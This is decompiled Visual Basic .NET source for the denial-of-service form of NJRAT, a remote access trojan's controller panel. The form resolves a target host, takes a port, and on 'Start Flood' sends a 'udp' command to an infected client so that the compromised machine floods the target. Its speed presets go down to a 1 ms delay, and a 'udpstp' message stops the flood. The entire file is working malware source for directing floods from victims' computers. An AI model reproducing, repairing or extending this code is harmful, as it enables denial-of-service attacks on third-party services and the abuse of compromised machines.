Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My

Namespace NJRAT
	' Token: 0x0200000F RID: 15
	<DesignerGenerated()>
	Public Partial Class Dos
		Inherits Form

		' Token: 0x06000127 RID: 295 RVA: 0x001509FC File Offset: 0x0014EDFC
		Public Sub New()
			AddHandler MyBase.Activated, AddressOf Me.Form2_Activated
			Dos.__ENCAddToList(Me)
			Me.delay = 100
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000128 RID: 296 RVA: 0x00150A30 File Offset: 0x0014EE30
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Dos.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Dos.__ENCList.Count = Dos.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Dos.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Dos.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Dos.__ENCList(num) = Dos.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Dos.__ENCList.RemoveRange(num, Dos.__ENCList.Count - num)
					Dos.__ENCList.Capacity = Dos.__ENCList.Count
				End If
				Dos.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700006C RID: 108
		' (get) Token: 0x0600012B RID: 299 RVA: 0x00151768 File Offset: 0x0014FB68
		' (set) Token: 0x0600012C RID: 300 RVA: 0x00151780 File Offset: 0x0014FB80
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700006D RID: 109
		' (get) Token: 0x0600012D RID: 301 RVA: 0x001517E0 File Offset: 0x0014FBE0
		' (set) Token: 0x0600012E RID: 302 RVA: 0x001517F8 File Offset: 0x0014FBF8
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700006E RID: 110
		' (get) Token: 0x0600012F RID: 303 RVA: 0x00151804 File Offset: 0x0014FC04
		' (set) Token: 0x06000130 RID: 304 RVA: 0x0015181C File Offset: 0x0014FC1C
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox2_TextChanged
				Dim flag As Boolean = Me._TextBox2 IsNot Nothing
				If flag Then
					RemoveHandler Me._TextBox2.TextChanged, value2
				End If
				Me._TextBox2 = value
				flag = (Me._TextBox2 IsNot Nothing)
				If flag Then
					AddHandler Me._TextBox2.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700006F RID: 111
		' (get) Token: 0x06000131 RID: 305 RVA: 0x0015187C File Offset: 0x0014FC7C
		' (set) Token: 0x06000132 RID: 306 RVA: 0x00151894 File Offset: 0x0014FC94
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000070 RID: 112
		' (get) Token: 0x06000133 RID: 307 RVA: 0x001518A0 File Offset: 0x0014FCA0
		' (set) Token: 0x06000134 RID: 308 RVA: 0x001518B8 File Offset: 0x0014FCB8
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x17000071 RID: 113
		' (get) Token: 0x06000135 RID: 309 RVA: 0x001518C4 File Offset: 0x0014FCC4
		' (set) Token: 0x06000136 RID: 310 RVA: 0x001518DC File Offset: 0x0014FCDC
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				Dim flag As Boolean = Me._Button2 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button2.Click, value2
				End If
				Me._Button2 = value
				flag = (Me._Button2 IsNot Nothing)
				If flag Then
					AddHandler Me._Button2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000072 RID: 114
		' (get) Token: 0x06000137 RID: 311 RVA: 0x0015193C File Offset: 0x0014FD3C
		' (set) Token: 0x06000138 RID: 312 RVA: 0x00151954 File Offset: 0x0014FD54
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000073 RID: 115
		' (get) Token: 0x06000139 RID: 313 RVA: 0x00151960 File Offset: 0x0014FD60
		' (set) Token: 0x0600013A RID: 314 RVA: 0x00151978 File Offset: 0x0014FD78
		Friend Overridable Property Logs As LV
			<DebuggerNonUserCode()>
			Get
				Return Me._Logs
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LV)
				Me._Logs = value
			End Set
		End Property

		' Token: 0x17000074 RID: 116
		' (get) Token: 0x0600013B RID: 315 RVA: 0x00151984 File Offset: 0x0014FD84
		' (set) Token: 0x0600013C RID: 316 RVA: 0x0015199C File Offset: 0x0014FD9C
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x17000075 RID: 117
		' (get) Token: 0x0600013D RID: 317 RVA: 0x001519A8 File Offset: 0x0014FDA8
		' (set) Token: 0x0600013E RID: 318 RVA: 0x001519C0 File Offset: 0x0014FDC0
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000076 RID: 118
		' (get) Token: 0x0600013F RID: 319 RVA: 0x001519CC File Offset: 0x0014FDCC
		' (set) Token: 0x06000140 RID: 320 RVA: 0x001519E4 File Offset: 0x0014FDE4
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000077 RID: 119
		' (get) Token: 0x06000141 RID: 321 RVA: 0x001519F0 File Offset: 0x0014FDF0
		' (set) Token: 0x06000142 RID: 322 RVA: 0x00151A08 File Offset: 0x0014FE08
		Friend Overridable Property ClearLogsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ClearLogsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ClearLogsToolStripMenuItem_Click
				Dim flag As Boolean = Me._ClearLogsToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._ClearLogsToolStripMenuItem.Click, value2
				End If
				Me._ClearLogsToolStripMenuItem = value
				flag = (Me._ClearLogsToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._ClearLogsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000078 RID: 120
		' (get) Token: 0x06000143 RID: 323 RVA: 0x00151A68 File Offset: 0x0014FE68
		' (set) Token: 0x06000144 RID: 324 RVA: 0x00151A80 File Offset: 0x0014FE80
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox1_SelectedIndexChanged
				Dim flag As Boolean = Me._ComboBox1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ComboBox1.SelectedIndexChanged, value2
				End If
				Me._ComboBox1 = value
				flag = (Me._ComboBox1 IsNot Nothing)
				If flag Then
					AddHandler Me._ComboBox1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000079 RID: 121
		' (get) Token: 0x06000145 RID: 325 RVA: 0x00151AE0 File Offset: 0x0014FEE0
		' (set) Token: 0x06000146 RID: 326 RVA: 0x00151AF8 File Offset: 0x0014FEF8
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x1700007A RID: 122
		' (get) Token: 0x06000147 RID: 327 RVA: 0x00151B04 File Offset: 0x0014FF04
		' (set) Token: 0x06000148 RID: 328 RVA: 0x00151B1C File Offset: 0x0014FF1C
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x1700007B RID: 123
		' (get) Token: 0x06000149 RID: 329 RVA: 0x00151B28 File Offset: 0x0014FF28
		' (set) Token: 0x0600014A RID: 330 RVA: 0x00151B40 File Offset: 0x0014FF40
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x0600014B RID: 331 RVA: 0x00151B4C File Offset: 0x0014FF4C
		Private Sub Form2_Activated(sender As Object, e As EventArgs)
			Me.TextBox2.Focus()
		End Sub

		' Token: 0x0600014C RID: 332 RVA: 0x00151B5C File Offset: 0x0014FF5C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start Flood", False) = 0
			If flag Then
				Me.Button1.Text = "Stop Flood"
				Try
					NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("udp", MyProject.Forms.Form1.Yy), Me.TextBox3.Text), MyProject.Forms.Form1.Yy), Me.TextBox2.Text), MyProject.Forms.Form1.Yy), Me.delay) }, Nothing, Nothing, Nothing, True)
					Me.Logs.Items.Add(String.Concat(New String() { "UDP Flood ", Me.TextBox1.Text, ":", Me.TextBox2.Text, " ", Me.ComboBox1.Text })).ForeColor = Color.MintCream
				Catch ex As Exception
				End Try
			Else
				Me.Button1.Text = "Start Flood"
				Me.s.Send("udpstp")
			End If
		End Sub

		' Token: 0x0600014D RID: 333 RVA: 0x00151CF8 File Offset: 0x001500F8
		Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs)
			Try
				Dim num As Integer = Conversions.ToInteger(Me.TextBox2.Text)
				Dim flag As Boolean = Conversions.ToDouble(Me.TextBox2.Text) > 65534.0 Or Conversions.ToDouble(Me.TextBox2.Text) < 1.0
				If flag Then
					Me.Button1.Enabled = False
				Else
					Me.Button1.Enabled = True
				End If
			Catch ex As Exception
				Me.Button1.Enabled = False
			End Try
		End Sub

		' Token: 0x0600014E RID: 334 RVA: 0x00151DA4 File Offset: 0x001501A4
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = CType(Dns.GetHostByName(Me.TextBox1.Text).AddressList.GetValue(0), IPAddress).ToString()
				Me.TextBox3.Text = text
			Catch ex As Exception
				Me.TextBox3.Text = "NONE!"
			End Try
		End Sub

		' Token: 0x0600014F RID: 335 RVA: 0x00151E1C File Offset: 0x0015021C
		Private Sub ClearLogsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.Logs.Items.Clear()
		End Sub

		' Token: 0x06000150 RID: 336 RVA: 0x00151E34 File Offset: 0x00150234
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.ComboBox1.Text, "VHigh", False) = 0
			If flag Then
				Me.delay = 20
			Else
				flag = (Operators.CompareString(Me.ComboBox1.Text, "High", False) = 0)
				If flag Then
					Me.delay = 50
				Else
					flag = (Operators.CompareString(Me.ComboBox1.Text, "Medium", False) = 0)
					If flag Then
						Me.delay = 100
					Else
						flag = (Operators.CompareString(Me.ComboBox1.Text, "Slow", False) = 0)
						If flag Then
							Me.delay = 250
						Else
							flag = (Operators.CompareString(Me.ComboBox1.Text, "VSlow", False) = 0)
							If flag Then
								Me.delay = 400
							Else
								flag = (Operators.CompareString(Me.ComboBox1.Text, "Full!!!", False) = 0)
								If flag Then
									Me.delay = 1
								End If
							End If
						End If
					End If
				End If
			End If
		End Sub

		' Token: 0x0400008B RID: 139
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400008D RID: 141
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400008E RID: 142
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x0400008F RID: 143
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x04000090 RID: 144
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000091 RID: 145
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000092 RID: 146
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x04000093 RID: 147
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000094 RID: 148
		<AccessedThroughProperty("Logs")>
		Private _Logs As LV

		' Token: 0x04000095 RID: 149
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x04000096 RID: 150
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000097 RID: 151
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000098 RID: 152
		<AccessedThroughProperty("ClearLogsToolStripMenuItem")>
		Private _ClearLogsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000099 RID: 153
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x0400009A RID: 154
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x0400009B RID: 155
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x0400009C RID: 156
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x0400009D RID: 157
		Public s As Client

		' Token: 0x0400009E RID: 158
		Public delay As Integer
	End Class
End Namespace
